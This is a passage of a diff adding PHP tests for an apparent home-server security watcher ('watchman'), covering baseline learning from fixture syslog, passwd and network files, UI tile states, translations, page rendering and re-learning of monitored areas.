+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    foreach (['go' => "#!/bin/bash\n/usr/local/sbin/emhttp &\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n",
+              'sec' => "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n", 'sec_nfs' => '', 'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    file_put_contents("$src/plugins/a.plg", "<PLUGIN name=\"a\" version=\"1\" pluginURL=\"https://github.com/alice/a/a.plg\">\n");
+    // the 1.96 parts' places: what runs at the start (the flash's .plg files, stop, modprobe.d), the router and the DNS
+    @mkdir("$src/flash-plugins", 0700);
+    @mkdir("$src/modprobe.d", 0700);
+    file_put_contents("$src/flash-plugins/a.plg", "<PLUGIN name=\"a\" version=\"1\">\n");
+    file_put_contents("$src/stop", "#!/bin/bash\n");
+    file_put_contents("$src/modprobe.d/i915.conf", "options i915 enable_guc=3\n");
+    file_put_contents("$src/route", "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
+        . "br0\t00000000\t0101A8C0\t0003\t0\t0\t0\t00000000\t0\t0\t0\n");
+    file_put_contents("$src/arp", "IP address       HW type     Flags       HW address            Mask     Device\n192.168.1.1      0x1         0x2         02:00:00:00:00:01     *        br0\n");
+    file_put_contents("$src/resolv.conf", "nameserver 192.168.1.1\n");
+    $paths += ['flash_plg' => "$src/flash-plugins", 'flash_stop' => "$src/stop", 'modprobe_d' => "$src/modprobe.d", 'route' => "$src/route", 'arp' => "$src/arp",
+               'resolv' => "$src/resolv.conf"];
+    $docker = fn () => ['web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]];
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $round($t0);
+    $round($t0 + 300);
+    // the data folder as 1.95 left it: no rules.json, no history, the 1.96 parts out of baseline and state
+    $d = watchmanLoad($data);
+    $b = $d['baseline'];
+    unset($b['flash']['boot'], $b['lan']);
+    $st = array_diff_key($d['state'], array_flip(['hot', 'vuln_seen', 'vuln_look', 'rule_hits', 'journal', 'signs', 'hw']));
+    writeAtomic("$data/baseline.json", jsonEncode($b), 0600);
+    writeAtomic("$data/state.json", jsonEncode($st), 0600);
+    @unlink("$data/rules.json");
+    @unlink("$data/hw.json");
+    $book = count(watchmanLoad($data)['book']);
+    $r = $round($t0 + 600);
+    same('from 1.95: the first 1.96 round on its data folder — nothing added, nothing told, the book as it was', [[], [], $book],
+        [$r['added'], $r['told'], count(watchmanLoad($data)['book'])]);
+    $r = $round($t0 + 900);
+    same('from 1.95: … and the round after', [[], []], [$r['added'], $r['told']]);
+    $nb = watchmanLoad($data)['baseline'];
+    same('from 1.95: the new parts learned their first look quietly — the start files, the router\'s MAC, the DNS', [true, ['02:00:00:00:00:01'], ['192.168.1.1']],
+        [count((array) ($nb['flash']['boot']['files'] ?? [])) >= 2, array_keys((array) ($nb['lan']['gw']['192.168.1.1'] ?? [])), $nb['lan']['dns'] ?? null]);
+    // the night shift from a mirror of 1.95's shape (its baseline without the 1.96 parts)
+    watchmanMirrorWrite($data, "$tmp/ram.json", null, $t0 + 950, 'boot-1');
+    $m = readJson("$tmp/ram.json");
+    unset($m['baseline']['flash']['boot'], $m['baseline']['lan']);
+    writeAtomic("$tmp/ram.json", jsonEncode($m), 0600);
+    @mkdir("$tmp/night", 0700);
+    $n = watchmanNightRound($paths, "$tmp/night", $t0 + 1000, false, $docker, "$tmp/ram.json", null, 'boot-1');
+    $n2 = watchmanNightRound($paths, "$tmp/night", $t0 + 1300, false, $docker, "$tmp/ram.json", null, 'boot-1');
+    $h = watchmanNightHandover($data, "$tmp/night", $t0 + 1400, "$tmp/no-lock");
+    same('from 1.95: a night shift from its mirror — nothing added, nothing told; the handover brings nothing new',
+        [[], [], [], 0], [$n['added'] ?? null, $n['told'] ?? null, $n2['added'] ?? null, (int) ($h['new'] ?? -1)]);
+    $r = $round($t0 + 1500);
+    same('from 1.95: the day round after the night — nothing', [[], []], [$r['added'], $r['told']]);
+    hardeningRm($tmp);
+}
+
+/**
+ * His 12 tiles over the 19 areas (1.96 «Der Nachtwächter, einfacher», watchman-cats.php): every area on exactly one tile;
+ * the flash's go, extra packages and start files on «Plugins and scripts», the server's start line on «The server»;
+ * one meaning per colour — red/yellow only for what waits (and a few hard findings), green «!» for an advice, green while
+ * it learns or a part sleeps, grey when he can't look (only when every part is grey); a tile off when all its areas are.
+ */
+/**
+ * His greeting comes first in the bubble, at random (core.js Office.greet()); the bubble then says how things stand. A
+ * greeting never says a state (2026-11-23: «Bin auf meinem Rundgang.» was greeting 3 — the bubble said it with no round
+ * running, and twice while one ran), so none repeats or contains a bubble sentence, in any language.
+ */
+function testWatchmanGreet(): void
+{
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
+        $d = json_decode((string) file_get_contents(OFFICE_DIR . "/public/desks/watchman/lang/$l.json"), true);
+        $bubbles = [];
+        foreach ($d as $k => $v) {
+            if (str_starts_with($k, 'bubble.')) {
+                foreach (is_array($v) ? $v : [$v] as $text) {
+                    foreach (preg_split('/(?<=[.!?…])\s+/u', (string) $text) as $sentence) {
+                        $bubbles[] = trim((string) preg_replace('/\{\w+\}/', '', $sentence));
+                    }
+                }
+            }
+        }
+        $bad = [];
+        for ($i = 1; isset($d["greet.$i"]); $i++) {
+            $g = trim((string) $d["greet.$i"]);
+            foreach ($bubbles as $b) {
+                if ($b !== '' && (mb_strtolower($g) === mb_strtolower($b) || str_contains(mb_strtolower($b), mb_strtolower(rtrim($g, '.…'))))) {
+                    $bad[] = "greet.$i «{$g}» ~ «{$b}»";
+                }
+            }
+        }
+        same("his greeting never says how things stand ($l): no bubble sentence in it", $bad, []);
+    }
+}
+
+/**
+ * «What he checks here» (1.96 «einfacher»): every one of the 12 areas has its fold in all five languages — what he looks
+ * at, when he speaks up, how often, an example — numbered from 1 without a gap; every placeholder is one the page fills
+ * (desk.js scopeValues(), or n for a counted line); each line at most two sentences; the help's «The areas» line each.
+ */
+function testWatchmanScope(): void
+{
+    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/desk.js');
+    preg_match('/function scopeValues\(\) \{(.*?)\n\}/s', $js, $m);
+    preg_match_all('/\b([a-z_]+): /', $m[1] ?? '', $vals);
+    $fills = array_merge($vals[1], ['n']);
+    same('the page fills the numbers it names (scopeValues)', count($vals[1]) >= 20, true);
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
+        $d = json_decode((string) file_get_contents(OFFICE_DIR . "/public/desks/watchman/lang/$l.json"), true);
+        $bad = [];
+        foreach (array_keys(WATCH_TILES) as $tile) {
+            foreach (['look', 'tell', 'when', 'example'] as $part) {
+                if (!isset($d["scope.$tile.{$part}_1"])) {
+                    $bad[] = "$tile.$part missing";
+                }
+            }
+            if (!isset($d["area.{$tile}_sub"])) {
+                $bad[] = "area.{$tile}_sub missing";
+            }
+        }
+        foreach ($d as $k => $v) {
+            if (!preg_match('/^scope\.(\w+)\.(look|tell|when|example)_(\d+)$/', $k, $km)) {
+                continue;
+            }
+            if (!isset(WATCH_TILES[$km[1]])) {
+                $bad[] = "$k: no such area";
+            }
+            if ((int) $km[3] > 1 && !isset($d["scope.$km[1].$km[2]_" . ((int) $km[3] - 1)])) {
+                $bad[] = "$k: a gap before it";
+            }
+            foreach (is_array($v) ? $v : [$v] as $text) {
+                preg_match_all('/\{(\w+)\}/', (string) $text, $ph);
+                foreach (array_diff($ph[1], $fills) as $x) {
+                    $bad[] = "$k: {{$x}} not filled";
+                }
+                // a sentence ends with . ! ? followed by a space and a capital (abbreviations like «Min.» before a digit don't count)
+                $sentences = preg_match_all('/(?<!\bMs|\bMr|\bMrs)[.!?](?=\s+\p{Lu})/u', (string) $text) + 1;
+                if ($km[2] !== 'example' && $sentences > 2) {
+                    $bad[] = "$k: $sentences sentences";
+                }
+            }
+        }
+        same("«What he checks here» ($l): each area, its four parts, its numbers filled, at most two sentences a line", $bad, []);
+    }
+    same('the help names each area in a line (helpAreas over TILES)', str_contains($js, "T('help.read_areas'), ''") && str_contains($js, 'function helpAreas('), true);
+}
+
+function testWatchmanTiles(): void
+{
+    $all = array_merge(...array_values(WATCH_TILES));
+    same('tiles: every area on exactly one tile', [[], []], [array_values(array_diff(array_keys(WATCH_CATS), $all)), array_values(array_diff_assoc($all, array_unique($all)))]);
+    same('tiles: the kinds that move', ['plugins', 'plugins', 'plugins', 'server', 'access', 'access', 'login', 'net', 'array'],
+        array_map('watchmanTileOf', ['flash_go', 'flash_extra', 'flash_boot', 'server_boot', 'flash_ssh_key', 'share_public', 'door_key_moved', 'net_dns', 'parity_check']));
+    $area = fn (array $why, ?int $off = null) => ['level' => '', 'why' => $why, 'tips' => in_array('tips', $why, true) ? 1 : 0] + ($off ? ['off' => $off] : []);
+    $areas = array_map(fn () => $area([]), WATCH_CATS);
+    $t = fn (array $over, array $book = []) => watchmanTiles(array_replace($areas, $over), $book);
+    $lvl = fn (array $tiles, string $id) => [$tiles[$id]['level'], $tiles[$id]['why']];
+    same('tiles: all quiet — green everywhere', ['ok'], array_values(array_unique(array_column($t([]), 'level'))));
+    same('tiles: an important entry open — red; one not important — yellow (counted on its own tile: go on «Plugins»)',
+        [['danger', ['open_tell']], ['warn', ['open']], ['ok', []]],
+        [$lvl($t([], [['kind' => 'login_new_ip', 'open' => true, 'tell' => true]]), 'login'), $lvl($t([], [['kind' => 'flash_go', 'open' => true, 'tell' => false]]), 'plugins'),
+         $lvl($t([], [['kind' => 'flash_go', 'open' => true, 'tell' => false]]), 'access')]);
+    same('tiles: an advice not known — green «!»; learning, a pool asleep — green with the reason',
+        [['note', ['tips']], ['ok', ['relearn_flow']], ['ok', ['asleep']]],
+        [$lvl($t(['door' => $area(['tips'])]), 'access'), $lvl($t(['pull' => $area(['relearn_flow'])]), 'data'), $lvl($t(['snap' => $area(['asleep'])]), 'snap')]);
+    same('tiles: can\'t reach one part — the other part keeps it green; every part — grey',
+        [['ok', ['syslog_full']], ['none', ['no_router']], ['none', ['docker_off']]],
+        [$lvl($t(['login' => $area(['syslog_full'])]), 'login'), $lvl($t(['router' => $area(['no_router']), 'lan' => $area(['no_router'])]), 'net'),
+         $lvl($t(['container' => $area(['docker_off'])]), 'container')]);
+    same('tiles: hard findings — a second unclean stop red, the time-out too short yellow, an NVMe\'s warning red',
+        ['danger', 'warn', 'danger'], [$t(['array' => $area(['parity_again'])])['array']['level'], $t(['hold' => $area(['hold_short'])])['array']['level'],
+         $t(['hw' => $area(['hw_nvme_warning'])])['hw']['level']]);
+    same('tiles: off when every area of it is off (its open entries no longer wait); one area off — not the tile',
+        [['none', ['off'], 50, 0], null], [(fn ($x) => [$x['level'], $x['why'], $x['off'], $x['open']])($t(['router' => $area([], 40), 'lan' => $area([], 50)],
+            [['kind' => 'net_dns', 'open' => true, 'tell' => false]])['net']), $t(['router' => $area([], 40)])['net']['off']]);
+    // the page state carries them, each entry and tip its tile; the old areas stay for an older page
+    $tmp = hardeningTmp('watch-tiles');
+    mkdir("$tmp/watchman", 0700, true);
+    writeAtomic("$tmp/watchman/baseline.json", jsonEncode(['hired' => 1000, 'time' => 1000, 'ips' => []]), 0600);
+    writeAtomic("$tmp/watchman/state.json", jsonEncode([]), 0600);
+    writeAtomic("$tmp/watchman/book.json", jsonEncode(['entries' => [watchmanEntry('flash_boot', 'flash_boot:x', 2000, ['file' => 'x'])]]), 0600);
+    $pg = watchmanPageState("$tmp/watchman", 3000, false);
+    same('tiles: the page state — 12 tiles, the 19 areas kept, an entry with its tile', [12, count(WATCH_CATS), 'plugins'],
+        [count($pg['tiles'] ?? []), count($pg['cats'] ?? []), $pg['book'][0]['tile'] ?? null]);
+    hardeningRm($tmp);
+}
+
+/**
+ * His page (1.96, Benj on the test stand): every filter bar of his shows from the first row on (the other desks keep
+ * Office.FILTER_MIN); his short lists (exceptions, your answers, the history) have one; «Known vulnerabilities» switched
+ * off says what he would check and has its switch right there; his setup's switch for it is the real one (vuln_set).
+ */
+function testWatchmanPageBars(): void
+{
+    $js = (string) file_get_contents(OFFICE_WEB . '/desks/watchman/desk.js');
+    $core = (string) file_get_contents(OFFICE_WEB . '/assets/core.js');
+    preg_match_all('/Office\.filterBar\(\{(.*?)\}\);/s', $js, $bars);
+    same('page bars: every filter bar of his says min: WM_FILTER_MIN (1) — the office\'s own minimum unchanged', [true, true, true, true],
+        [count($bars[1]) >= 4, !array_filter($bars[1], fn ($b) => !str_contains($b, 'min: WM_FILTER_MIN')), str_contains($js, 'const WM_FILTER_MIN = 1;'),
+         str_contains($core, 'Office.FILTER_MIN = 10;')]);
+    same('page bars: his exceptions, your answers and his history have a bar', [true, true, true],
+        [str_contains($js, "listBar('rules.' + id"), str_contains($js, "listBar('known.' + id"), str_contains($js, "listBar('journal'")]);
+    check('page: your answers unfold on his setup page too (the shown page\'s sections drawn, not the watch\'s)',
+        str_contains($js, 'Office.keepInPlace(head, () => pageSw().render()); };'));
+    same('vuln off: what he would check, the switch in the callout; his setup\'s switch is vuln_set', [true, true, true],
+        [str_contains($js, "T('vuln.explain_lists')") && str_contains($js, "T('vuln.explain_here')") && str_contains($js, "T('vuln.explain_says')"),
+         (bool) preg_match('/function vulnOffBox\(\).*?vulnButton\(\)/s', $js), str_contains($js, "cb.onchange = () => (vuln ? vulnSet(cb.checked, cb) : tileOffAsk(id, !cb.checked, cb));")]);
+    // the words name only what the code fetches and compares (watchman-vuln.php)
+    $en = langFile(OFFICE_WEB . '/desks/watchman/lang/en.json');
+    $hosts = array_map(fn ($u) => preg_replace('/^www\./', '', (string) parse_url($u, PHP_URL_HOST)), WATCH_VULN_URLS);
+    same('vuln off: its words name every list he fetches', [], array_values(array_filter($hosts, fn ($h) => !str_contains($en['vuln.explain_lists'] ?? '', $h))));
+    // (2026-11-26: by its environment, its label or a file it names)
+    $labels = array_column(array_filter(WATCH_VULN_PRODUCTS, fn ($p) => isset($p['env']) || isset($p['oci']) || isset($p['file'])), 'label');
+    same('vuln off: … every software an image may declare', [], array_values(array_filter($labels, fn ($l) => !str_contains($en['vuln.explain_here'] ?? '', $l))));
+}
+
+/**
+ * A data folder as the 1.96 test stand left it renders in the new page (1.96 «Der Nachtwächter, einfacher»: the brief
+ * asked for it — the core's files unchanged in shape): rounds on copies, an answer given («I know, thanks» → a lasting
+ * answer in rules.json), an exception by hand, a setting off its default, an area switched off; the messenger's page state
+ * from it, drawn by desk.js under node (tests/watchwakes.js «stand»): every tile, the book, the schedule, old places and
+ * every tile of his setup without an error, the exception and the answer in the setup of «Logins», the area off said.
+ */
+function testWatchmanStandRender(): void
+{
+    $tmp = hardeningTmp('watch-stand');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-11-20 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    foreach (['go' => "#!/bin/bash\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n",
+              'sec' => "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n", 'sec_nfs' => '', 'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    $docker = fn () => ['web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]];
+    watchmanRound($paths, $data, 1000, $t0, $docker, false, "$tmp/acks.json");
+    file_put_contents($paths['syslog'], $line($t0 + 100, 'webgui: Successful login user root from 192.168.30.5'), FILE_APPEND);
+    file_put_contents($paths['syslog'], $line($t0 + 110, 'webgui: Successful login user root from 192.168.40.6'), FILE_APPEND);
+    watchmanRound($paths, $data, 1000, $t0 + 300, $docker, false, "$tmp/acks.json");
+    $open = array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => watchmanOpen($e) && ($e['p']['ip'] ?? '') === '192.168.30.5'));
+    watchmanAck($open[0]['id'], $data, $t0 + 400, false);                        // a lasting answer (rules.json known)
+    watchmanRuleHand('login', 'net', '192.168.50.0/24', '', false, $data, $t0 + 410, false);     // an exception by hand
+    watchmanCatSettings('login', ['burst' => 8], false, $data, false);           // a setting off its default
+    watchmanCatOff('snap', true, true, $data, $t0 + 420, false);                 // an area switched off
+    $raw = watchmanRulesRaw($data);
+    same('stand: rules.json as the test stand has it — an exception, an answer, a setting, an area off', [1, 1, 8, true],
+        [count($raw['rules'] ?? []), count($raw['known'] ?? []), $raw['set']['login']['burst'] ?? null, isset($raw['off']['snap'])]);
+    $page = watchmanPageState($data, $t0 + 500, false);
+    same('stand: the page state carries the tiles, «Snapshots and backup» off, the login waiting on «Logins»', [12, true, 'login'],
+        [count($page['tiles']), !empty($page['tiles']['snap']['off']), array_values(array_filter($page['book'], fn ($e) => $e['open']))[0]['tile'] ?? null]);
+    @mkdir("$tmp/states", 0700);
+    file_put_contents("$tmp/states/watchman.json", json_encode($page));
+    $node = testsNode();
+    if ($node === '') {
+        check('stand: node is missing here - skipped', true);
+        hardeningRm($tmp);
+        return;
+    }
+    $out = (string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg(OFFICE_DIR . '/tests/watchwakes.js') . ' ' . escapeshellarg(OFFICE_WEB . '/assets/core.js') . ' '
+        . escapeshellarg(OFFICE_WEB . '/desks/watchman/desk.js') . ' ' . escapeshellarg("$tmp/states") . ' stand 2>&1');
+    $lines = array_values(array_filter(explode("\n", trim($out))));
+    $r = json_decode((string) end($lines), true);
+    check('stand: drawn under node (' . (is_array($r) ? $r['pass'] : '?') . ' checks)', is_array($r) && $r['pass'] >= 3 && !$r['fail'], $out);
+    foreach (is_array($r) ? $r['fail'] : [] as $f) {
+        check('stand: ' . ($f[0] ?? '?'), false, 'got ' . json_encode($f[1] ?? null) . ', want ' . json_encode($f[2] ?? null));
+    }
+    hardeningRm($tmp);
+}
+
+/**
+ * «Re-learn this area…» / «Re-learn everything…» (1.96 step 17, the concept 12.2): an area's open entries noted «by
+ * re-learning», your answers (and with the checkboxes its exceptions and settings) set aside, what is there now learned by
+ * the round it starts — a known address never «new»; no other area touched; the night shift's mirror to the flash at once;
+ * «Bring back…» within 7 days; the data flow's two areas each their own learning time; during the learning phase too.
+ */
+function testWatchmanRelearn(): void
+{
+    $tmp = hardeningTmp('watch-relearn');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root', 'flash-plugins', 'modprobe.d'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd", 'flash_plg' => "$src/flash-plugins", 'flash_stop' => "$src/stop",
+              'modprobe_d' => "$src/modprobe.d", 'route' => "$src/route", 'arp' => "$src/arp", 'resolv' => "$src/resolv.conf"];
+    $t0 = strtotime('2026-11-20 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    $login = fn (int $t, string $ip) => file_put_contents($paths['syslog'], $line($t, "webgui: Successful login user root from $ip"), FILE_APPEND);
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    foreach (['go' => "#!/bin/bash\n/usr/local/sbin/emhttp &\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n",
+              'sec' => "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n", 'sec_nfs' => '', 'share_cfg' => "shareSMBEnabled=\"yes\"\n", 'flash_stop' => "#!/bin/bash\n",
+              'resolv' => "nameserver 192.168.1.1\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    file_put_contents("$src/plugins/a.plg", "<PLUGIN name=\"a\" version=\"1\" pluginURL=\"https://github.com/alice/a/a.plg\">\n");
+    file_put_contents("$src/flash-plugins/a.plg", "<PLUGIN name=\"a\" version=\"1\">\n");
+    file_put_contents("$src/route", "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
+        . "br0\t00000000\t0101A8C0\t0003\t0\t0\t0\t00000000\t0\t0\t0\n");
+    file_put_contents($paths['arp'], "IP address       HW type     Flags       HW address            Mask     Device\n192.168.1.1      0x1         0x2         02:00:00:00:00:01     *        br0\n");
+    $cts = ['web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]];
+    $docker = function () use (&$cts) { return $cts; };
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    $round($t0);
+    $round($t0 + 300);
+
+    // something open in two areas: a login from a new address, a new container; an exception and a lasting answer of the logins
+    $login($t0 + 400, '192.168.30.5');
+    $cts['db'] = ['image' => 'postgres', 'tokens' => ['--privileged']];
+    $round($t0 + 600);
+    $openKinds = fn () => array_values(array_map(fn ($e) => $e['kind'], array_filter(watchmanLoad($data)['book'], 'watchmanOpen')));
+    same('relearn: before — a login and a container open', ['container_new', 'login_new_ip'], (function () use ($openKinds) { $k = $openKinds(); sort($k); return $k; })());
+    $rule = ['id' => 'r00000000aa', 'cat' => 'login', 'kinds' => WATCH_RULE_LOGIN, 'on' => ['net' => '192.168.50.0/24'], 'at' => $t0, 'from' => 'hand'];
+    $ruleC = ['id' => 'r00000000bb', 'cat' => 'container', 'kinds' => ['container_new'], 'on' => ['key' => 'container_new:x'], 'at' => $t0, 'from' => 'hand'];
+    $knownL = ['id' => 'k00000000aa', 'cat' => 'login', 'kind' => 'login_new_ip', 'key' => 'login_new_ip:192.168.40.1', 'at' => $t0];
+    file_put_contents("$data/rules.json", json_encode(['v' => 1, 'rules' => [$rule, $ruleC], 'known' => [$knownL], 'set' => ['login' => ['burst' => 9], 'container' => ['plain' => false]],
+        'future' => 'kept']));
+    $before = watchmanLoad($data);
+    watchmanMirrorWrite($data, "$tmp/ram.json", "$tmp/flash.json", $t0 + 650, 'boot-1');      // the flash's mirror before it
+    touch("$tmp/flash.json", $t0 + 650);
+    clearstatcache();
+    $res = watchmanRelearn(['login'], true, false, $data, $t0 + 700, false);
+    $d = watchmanLoad($data);
+    $raw = watchmanRulesRaw($data);
+    $aside = "$data/aside/{$res['aside']}";
+    same('relearn: the login noted «by relearn», the container still open; one line in his book', [['container_new'], 'relearn', 1],
+        [$openKinds(), array_values(array_filter($d['book'], fn ($e) => $e['kind'] === 'login_new_ip'))[0]['by'] ?? null,
+         count(array_filter($d['book'], fn ($e) => $e['kind'] === 'watch' && ($e['p']['relearn'] ?? null) === 'login'))]);
+    same('relearn: the logins\' exception (checkbox) and answer gone, the container\'s exception, every setting and unknown keys kept',
+        [['r00000000bb'], [], ['login' => ['burst' => 9], 'container' => ['plain' => false]], 'kept'],
+        [array_column($raw['rules'], 'id'), $raw['known'] ?? [], $raw['set'] ?? null, $raw['future'] ?? null]);
+    $keep = readJson("$aside/relearn.json");
+    same('relearn: set aside first, a real folder 0700 — what was normal, the exception, the answer, the entry it closed', [true, '0700', ['login'], 1, 1, 1, true],
+        [is_dir($aside) && !is_link($aside), substr(sprintf('%o', fileperms($aside)), -4), $keep['cats'] ?? null, count($keep['rules'] ?? []), count($keep['known'] ?? []),
+         count($keep['closed'] ?? []), array_key_exists('ips', (array) ($keep['baseline'] ?? []))]);
+    same('relearn: the round learns it (pending), the page says since when and until when', [true, ['at' => $t0 + 700, 'until' => $t0 + 700 + 7 * 86400, 'pending' => true]],
+        [isset($d['state']['relearn_pending']['login']), array_intersect_key(watchmanRelearnPage($d['state'], $t0 + 800)['login'] ?? [], ['at' => 1, 'until' => 1, 'pending' => 1])]);
+    $pg = watchmanPageState($data, $t0 + 800, false);
+    same('relearn: its tile green with «!» (relearn), the container\'s as it was', [true, false],
+        [in_array('relearn', $pg['cats']['login']['why'], true), in_array('relearn', $pg['cats']['container']['why'], true)]);
+    same('relearn: refused — an area he doesn\'t have, twice the same, none', ['bad_request', 'bad_request', 'bad_request'],
+        [$err(fn () => watchmanRelearn(['nope'], false, false, $data, $t0 + 701, false)), $err(fn () => watchmanRelearn(['login', 'login'], false, false, $data, $t0 + 701, false)),
+         $err(fn () => watchmanRelearn([], false, false, $data, $t0 + 701, false))]);
+
+    // the night shift: its mirror to the flash at once (not after the hour)
+    same('relearn: the mirror goes to the flash at once after it (a re-learn is your click, like «I know, thanks»)', 'flash',
+        watchmanMirrorWrite($data, "$tmp/ram.json", "$tmp/flash.json", $t0 + 710, 'boot-1'));
+
+    // the round: the addresses of the syslog's history learned again — the known one (and the new one of before) normal
+    $r = $round($t0 + 900);
+    $b = watchmanLoad($data)['baseline'];
+    same('relearn round: nothing added, the addresses from the syslog\'s history, pending done', [[], ['192.168.20.10', '192.168.30.5'], false],
+        [$r['added'], (function () use ($b) { $k = array_keys($b['ips']); sort($k); return $k; })(), isset(watchmanLoad($data)['state']['relearn_pending'])]);
+    same('relearn round: no other area touched — the new container still not normal, its entry open', [false, ['container_new']],
+        [isset($b['containers']['db']), $openKinds()]);
+    $login($t0 + 950, '192.168.30.5');
+    $login($t0 + 960, '192.168.20.10');
+    $r = $round($t0 + 1200);
+    same('relearn: a known address logs in again — never «new»', [], $r['added']);
+    $login($t0 + 1250, '192.168.77.7');
+    $r = $round($t0 + 1500);
+    same('relearn: … a new one still is', ['login_new_ip'], $r['added']);
+    // the night after it: from the mirror as it is now, a known address is nothing
+    watchmanMirrorWrite($data, "$tmp/ram.json", null, $t0 + 1550, 'boot-1');
+    @mkdir("$tmp/night", 0700);
+    $login($t0 + 1580, '192.168.30.5');
+    $n = watchmanNightRound($paths, "$tmp/night", $t0 + 1600, false, $docker, "$tmp/ram.json", null, 'boot-1');
+    same('relearn: the night shift sees the new normal — the re-learned address nothing', [], $n['added'] ?? null);
+    watchmanNightHandover($data, "$tmp/night", $t0 + 1650, "$tmp/no-lock");
+
+    // «Bring back…»: the old normal, the exception, the answer; its entry open again; the folder kept, renamed
+    $back = watchmanRelearnBack($res['aside'], $data, $t0 + 1700, false);
+    $d = watchmanLoad($data);
+    $raw = watchmanRulesRaw($data);
+    same('back: the closed entry open again, the exception and the answer back, the old addresses, the tile as before',
+        [1, ['r00000000bb', 'r00000000aa'], ['k00000000aa'], array_keys($before['baseline']['ips']), false, true, true],
+        [$back['reopened'], array_column($raw['rules'], 'id'), array_column($raw['known'] ?? [], 'id'), array_keys($d['baseline']['ips']),
+         isset($d['state']['relearn']['login']), is_dir("$aside-back"), (bool) array_filter($d['book'], fn ($e) => $e['kind'] === 'login_new_ip' && ($e['p']['ip'] ?? '') === '192.168.30.5' && watchmanOpen($e))]);
+    same('back: twice — gone; a bad name refused', ['watch_relearn_gone', 'bad_request'],
+        [$err(fn () => watchmanRelearnBack($res['aside'], $data, $t0 + 1800, false)), $err(fn () => watchmanRelearnBack('../x', $data, $t0 + 1800, false))]);
+    $res2 = watchmanRelearn(['container'], false, true, $data, $t0 + 2000, false);
+    same('relearn with «settings back»: only that area\'s settings go', ['login' => ['burst' => 9]], watchmanRulesRaw($data)['set'] ?? null);
+    same('back: after 7 days no more', 'watch_relearn_old', $err(fn () => watchmanRelearnBack($res2['aside'], $data, $t0 + 2000 + 8 * 86400, false)));
+
+    // each area's round part touches its own parts only: a baseline with a mark in every part, one area re-learned at a time
+    $seen = readJson("$data/seen.json");
+    $marked = watchmanLoad($data)['baseline'];
+    $marks = ['login' => 'ips', 'container' => 'containers', 'plugin' => 'plugins', 'share' => 'shares', 'sched' => 'sched', 'flash' => 'flash',
+              'partner' => 'partner', 'lan' => 'lan'];
+    foreach ($marks as $cat => $part) {
+        $marked[$part] = (array) ($marked[$part] ?? []);
+        $marked[$part]["mark-$cat"] = ['first' => 1, 'last' => 1];
+    }
+    foreach ($marks as $cat => $part) {
+        $bb = $marked;
+        $sst = ['relearn_pending' => [$cat => 1]];
+        $was = watchmanRelearnApply($bb, $sst, $seen, [], null, $t0 + 3000);
+        $left = array_keys(array_filter($marks, fn ($p, $c) => isset($bb[$p]["mark-$c"]), ARRAY_FILTER_USE_BOTH));
+        same("relearn apply: «{$cat}» learned anew (its mark gone), every other area as it was", array_values(array_diff(array_keys($marks), [$cat])), $left);
